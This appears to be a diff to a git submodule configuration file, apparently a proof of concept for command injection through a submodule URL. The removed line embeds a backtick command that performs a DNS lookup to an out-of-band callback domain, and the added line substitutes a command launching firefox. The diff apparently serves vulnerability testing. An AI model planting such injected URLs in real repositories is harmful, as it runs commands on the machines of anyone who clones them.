@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`nslookup kf30yxfys1pn36vivgo19xioyf46sygn.oastify.com`foo.example.com/bar
+	url = ssh://`firefox`foo.example.com/bar
